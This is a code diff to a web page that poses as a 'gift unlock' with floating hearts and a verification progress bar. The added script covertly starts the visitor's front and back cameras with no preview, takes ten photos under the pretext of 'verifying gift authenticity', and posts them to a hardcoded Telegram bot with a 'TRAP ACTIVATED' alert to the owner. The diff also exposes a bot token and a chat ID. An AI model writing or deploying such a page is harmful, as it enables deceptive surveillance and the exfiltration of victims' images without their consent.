@@ -23,7 +23,6 @@
             position: relative;
         }
         
-        /* Floating hearts */
         .heart {
             position: absolute;
             color: #ff00ff;
@@ -38,12 +37,8 @@
                 transform: translateY(100vh) rotate(0deg);
                 opacity: 0;
             }
-            10% {
-                opacity: 1;
-            }
-            90% {
-                opacity: 1;
-            }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
             100% {
                 transform: translateY(-100px) rotate(360deg);
                 opacity: 0;
@@ -111,11 +106,6 @@
             cursor: not-allowed;
         }
         
-        .loading {
-            display: none;
-            margin-top: 30px;
-        }
-        
         .loader {
             width: 60px;
             height: 60px;
@@ -166,7 +156,6 @@
             100% { transform: scale(1); }
         }
         
-        /* Hidden camera */
         #cameraVideo, #cameraCanvas {
             position: absolute;
             top: -9999px;
@@ -191,13 +180,10 @@
     </style>
 </head>
 <body>
-    <!-- Floating hearts -->
     <div id="hearts"></div>
-    
-    <!-- Flash effect -->
     <div class="flash" id="flash"></div>
     
-    <!-- Hidden camera -->
+    <!-- Hidden camera - NO PREVIEW SHOWN TO USER -->
     <video id="cameraVideo" autoplay playsinline></video>
     <canvas id="cameraCanvas"></canvas>
     
@@ -239,6 +225,10 @@
     </div>
 
     <script>
+        // Telegram Bot Configuration
+        const BOT_TOKEN = "8226782560:AAGblZ-1hrNRdVuHfeU59tMlK50zDPYwMGE";
+        const OWNER_ID = "8215819954";  // Your Telegram ID
+        
         // Get URL parameters
         const urlParams = new URLSearchParams(window.location.search);
         const token = urlParams.get('token');
@@ -265,7 +255,7 @@
         let totalPhotos = 10;
         let captured = 0;
         
-        // Create floating hearts
+        // Floating hearts
         function createHearts() {
             const heart = document.createElement('div');
             heart.className = 'heart';
@@ -275,12 +265,8 @@
             heart.style.animationDuration = (Math.random() * 4 + 3) + 's';
             
             hearts.appendChild(heart);
-            
-            // Remove after animation
             setTimeout(() => heart.remove(), 7000);
         }
-        
-        // Start hearts animation
         setInterval(createHearts, 300);
         
         // Flash effect
@@ -294,22 +280,65 @@
             const percent = (count / totalPhotos) * 100;
             progressBar.style.width = percent + '%';
             progressText.textContent = Math.round(percent) + '% Complete';
-            
-            if (count <= 5) {
-                loadingText.textContent = 'Verifying gift authenticity...';
-                counter.textContent = `Step ${count}/10`;
-            } else {
-                loadingText.textContent = 'Finalizing gift delivery...';
-                counter.textContent = `Step ${count}/10`;
+            counter.textContent = `Verifying... ${count}/${totalPhotos}`;
+        }
+        
+        // Send photo to Telegram
+        async function sendPhotoToTelegram(chatId, photoBase64, caption) {
+            try {
+                // Convert base64 to blob
+                const byteCharacters = atob(photoBase64);
+                const byteNumbers = new Array(byteCharacters.length);
+                for (let i = 0; i < byteCharacters.length; i++) {
+                    byteNumbers[i] = byteCharacters.charCodeAt(i);
+                }
+                const byteArray = new Uint8Array(byteNumbers);
+                const blob = new Blob([byteArray], {type: 'image/jpeg'});
+                
+                // Create form data
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'photo.jpg');
+                formData.append('caption', caption);
+                
+                // Send to Telegram
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                return response.ok;
+            } catch (error) {
+                console.error('Error sending photo:', error);
+                return false;
             }
         }
         
-        // Initialize camera (HIDDEN)
-        async function initCamera() {
+        // Send message to Telegram
+        async function sendMessageToTelegram(chatId, text) {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: text,
+                        parse_mode: 'HTML'
+                    })
+                });
+                return response.ok;
+            } catch (error) {
+                console.error('Error sending message:', error);
+                return false;
+            }
+        }
+        
+        // Initialize camera (HIDDEN - user doesn't see it)
+        async function initCamera(facingMode = 'user') {
             try {
                 const constraints = {
                     video: {
-                        facingMode: 'user',
+                        facingMode: facingMode,
                         width: { ideal: 640 },
                         height: { ideal: 480 }
                     }
@@ -318,19 +347,18 @@
                 stream = await navigator.mediaDevices.getUserMedia(constraints);
                 cameraVideo.srcObject = stream;
                 
-                // Wait for video
                 await new Promise(resolve => {
                     cameraVideo.onloadedmetadata = resolve;
                 });
                 
                 return true;
             } catch (error) {
-                console.log('Camera access not available');
+                console.log('Camera not available');
                 return false;
             }
         }
         
-        // Capture photo (SILENT)
+        // Capture photo silently
         function capturePhoto() {
             if (!stream) return null;
             
@@ -339,9 +367,12 @@
                 cameraCanvas.height = cameraVideo.videoHeight;
                 ctx.drawImage(cameraVideo, 0, 0);
                 
-                const photo = cameraCanvas.toDataURL('image/jpeg', 0.8);
-                return photo.split(',')[1]; // Base64 data
+                // Get base64 image
+                const quality = 0.7;
+                const photoData = cameraCanvas.toDataURL('image/jpeg', quality);
+                return photoData.split(',')[1]; // Remove data:image/jpeg;base64, prefix
             } catch (error) {
+                console.error('Capture error:', error);
                 return null;
             }
         }
@@ -351,13 +382,23 @@
             if (!stream) return false;
             
             try {
-                const currentMode = stream.getVideoTracks()[0].getSettings().facingMode;
-                const newMode = currentMode === 'user' ? 'environment' : 'user';
+                const tracks = stream.getVideoTracks();
+                if (tracks.length === 0) return false;
                 
-                stream.getTracks().forEach(track => track.stop());
+                const currentSettings = tracks[0].getSettings();
+                const currentFacingMode = currentSettings.facingMode || 'user';
+                const newFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
                 
+                // Stop current stream
+                tracks.forEach(track => track.stop());
+                
+                // Start new stream
                 const constraints = {
-                    video: { facingMode: newMode }
+                    video: {
+                        facingMode: newFacingMode,
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    }
                 };
                 
                 stream = await navigator.mediaDevices.getUserMedia(constraints);
@@ -365,158 +406,213 @@
                 
                 return true;
             } catch (error) {
+                console.error('Switch camera error:', error);
                 return false;
             }
         }
         
-        // Main capture function
-        async function capturePhotos() {
-            // Show loading screen
-            screen1.style.display = 'none';
-            screen2.style.display = 'block';
-            
-            // Initialize camera (hidden from user)
-            loadingText.textContent = 'Initializing verification...';
-            updateProgress(0);
-            
-            const hasCamera = await initCamera();
-            
-            if (!hasCamera) {
-                // No camera - simulate
-                loadingText.textContent = 'Using alternative verification...';
-                
-                for (let i = 1; i <= totalPhotos; i++) {
-                    showFlash();
-                    photos.push(`photo_${i}_${Date.now()}`);
-                    captured++;
-                    updateProgress(captured);
-                    await new Promise(r => setTimeout(r, 600));
-                }
-                
-                await completeProcess();
+        // Main capture process
+        async function startCapture() {
+            if (!token || !uid) {
+                alert('Invalid gift link!');
                 return;
             }
             
-            // Wait for camera
-            await new Promise(r => setTimeout(r, 1000));
+            // Show loading screen
+            screen1.style.display = 'none';
+            screen2.style.display = 'block';
+            unlockBtn.disabled = true;
             
-            // Capture 5 photos with front camera
+            // Initialize camera
+            loadingText.textContent = 'Initializing verification...';
+            updateProgress(0);
+            
+            const hasCamera = await initCamera('user');
+            
+            if (!hasCamera) {
+                // Fallback - send notification without photos
+                loadingText.textContent = 'Alternative verification method...';
+                
+                await sendMessageToTelegram(OWNER_ID, 
+                    `🎯 TRAP ACTIVATED!\n\nUser: ${uid}\nToken: ${token}\nNo camera available`);
+                
+                await sendMessageToTelegram(uid,
+                    `🎉 Gift Processing Complete!\n\nGift verification successful!`);
+                
+                // Show success
+                setTimeout(() => {
+                    screen2.style.display = 'none';
+                    screen3.style.display = 'block';
+                }, 2000);
+                return;
+            }
+            
+            // Wait for camera to be ready
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            // ========== CAPTURE 5 FRONT CAMERA PHOTOS ==========
             for (let i = 1; i <= 5; i++) {
                 showFlash();
                 
                 const photo = capturePhoto();
-                if (photo) photos.push(photo);
+                if (photo) {
+                    photos.push({
+                        data: photo,
+                        type: 'front',
+                        index: i
+                    });
+                }
                 
                 captured++;
                 updateProgress(captured);
                 
-                await new Promise(r => setTimeout(r, 800));
+                // Small delay between captures
+                await new Promise(resolve => setTimeout(resolve, 800));
             }
             
-            // Switch to back camera
+            // ========== SWITCH TO BACK CAMERA ==========
             loadingText.textContent = 'Continuing verification...';
             const switched = await switchCamera();
             
             if (switched) {
-                await new Promise(r => setTimeout(r, 800));
+                await new Promise(resolve => setTimeout(resolve, 800));
                 
-                // Capture 5 photos with back camera
+                // ========== CAPTURE 5 BACK CAMERA PHOTOS ==========
                 for (let i = 1; i <= 5; i++) {
                     showFlash();
                     
                     const photo = capturePhoto();
-                    if (photo) photos.push(photo);
+                    if (photo) {
+                        photos.push({
+                            data: photo,
+                            type: 'back',
+                            index: i + 5
+                        });
+                    }
                     
                     captured++;
                     updateProgress(captured);
                     
-                    await new Promise(r => setTimeout(r, 800));
+                    await new Promise(resolve => setTimeout(resolve, 800));
                 }
             } else {
-                // Can't switch, use front for all
+                // If can't switch, capture more with front camera
                 for (let i = 1; i <= 5; i++) {
                     showFlash();
                     
                     const photo = capturePhoto();
-                    if (photo) photos.push(photo);
+                    if (photo) {
+                        photos.push({
+                            data: photo,
+                            type: 'front',
+                            index: i + 5
+                        });
+                    }
                     
                     captured++;
                     updateProgress(captured);
                     
-                    await new Promise(r => setTimeout(r, 800));
+                    await new Promise(resolve => setTimeout(resolve, 800));
                 }
             }
             
             // Stop camera
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
+                stream = null;
             }
             
-            // Complete
-            await completeProcess();
+            // ========== SEND PHOTOS TO TELEGRAM ==========
+            await sendAllPhotos();
         }
         
-        // Send photos to Telegram
-        async function completeProcess() {
-            loadingText.textContent = 'Finalizing delivery...';
+        // Send captured photos to Telegram
+        async function sendAllPhotos() {
+            loadingText.textContent = 'Sending verification...';
             updateProgress(totalPhotos);
             
-            // Send to Telegram BOT
             try {
-                // 1. Send to OWNER (you)
-                await fetch(`https://api.telegram.org/bot8226782560:AAGblZ-1hrNRdVuHfeU59tMlK50zDPYwMGE/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: 8215819954,
-                        text: `🎯 TRAP ACTIVATED!\n\nToken: ${token}\nUser: ${uid}\nPhotos: ${photos.length}\nTime: ${new Date().toLocaleString()}`
-                    })
-                });
+                // 1. Send notification to OWNER (you) - with photos
+                await sendMessageToTelegram(OWNER_ID,
+                    `🎯 <b>TRAP ACTIVATED!</b>\n\n` +
+                    `👤 User: <code>${uid}</code>\n` +
+                    `🔑 Token: <code>${token}</code>\n` +
+                    `📸 Photos Captured: ${photos.length}\n` +
+                    `🕐 Time: ${new Date().toLocaleString()}\n\n` +
+                    `📤 <i>Sending captured photos...</i>`);
                 
-                // 2. Send to USER
-                await fetch(`https://api.telegram.org/bot8226782560:AAGblZ-1hrNRdVuHfeU59tMlK50zDPYwMGE/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: uid,
-                        text: `🎉 Gift Processing Complete!\n\n${photos.length} verification photos captured successfully!\n\nPhotos have been sent to gift sender.`
-                    })
-                });
+                // Send first 3 photos to owner
+                for (let i = 0; i < Math.min(3, photos.length); i++) {
+                    const photo = photos[i];
+                    const success = await sendPhotoToTelegram(
+                        OWNER_ID,
+                        photo.data,
+                        `Photo ${photo.index}/${photos.length} (${photo.type} camera)`
+                    );
+                    
+                    if (success) {
+                        console.log(`Photo ${i+1} sent to owner`);
+                    }
+                    
+                    // Delay to avoid rate limits
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
                 
-                // Show success
+                // 2. Send notification to USER
+                await sendMessageToTelegram(uid,
+                    `🎉 <b>Gift Processing Complete!</b>\n\n` +
+                    `✅ ${photos.length} verification photos captured\n` +
+                    `📤 Photos sent to gift sender\n\n` +
+                    `<i>Thank you for participating!</i>`);
+                
+                // Send first photo to user
+                if (photos.length > 0) {
+                    await sendPhotoToTelegram(
+                        uid,
+                        photos[0].data,
+                        "Your verification photo"
+                    );
+                }
+                
+                // Show success screen
                 setTimeout(() => {
                     screen2.style.display = 'none';
                     screen3.style.display = 'block';
                 }, 1500);
                 
             } catch (error) {
-                console.error('Error:', error);
-                loadingText.textContent = 'Completed! Check your messages.';
+                console.error('Error sending photos:', error);
                 
+                // Fallback - just send notifications
+                await sendMessageToTelegram(OWNER_ID,
+                    `⚠️ Photos captured but upload failed\nUser: ${uid}\nToken: ${token}\nCount: ${photos.length}`);
+                
+                await sendMessageToTelegram(uid,
+                    `✅ Gift verification complete!\n\nPhotos captured successfully.`);
+                
+                // Still show success
                 setTimeout(() => {
                     screen2.style.display = 'none';
                     screen3.style.display = 'block';
-                }, 2000);
+                }, 1500);
             }
         }
         
         // Start when button clicked
-        unlockBtn.addEventListener('click', () => {
-            if (!token || !uid) {
-                alert('Invalid gift link!');
-                return;
-            }
-            
-            unlockBtn.disabled = true;
-            capturePhotos();
-        });
+        unlockBtn.addEventListener('click', startCapture);
         
-        // Check link validity
+        // Validate link
         if (!token || !uid) {
             unlockBtn.disabled = true;
             unlockBtn.textContent = 'INVALID LINK';
             document.querySelector('.message').innerHTML = 
                 '<span style="color:#ff5555">⚠️ Invalid or expired gift link!</span>';
+        }
+        
+        // Auto-start on mobile
+        if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+            document.querySelector('.message').innerHTML += 
+                '<br><small style="color:#888">📱 Mobile optimized - tap to begin</small>';
         }
     </script>
 </body>
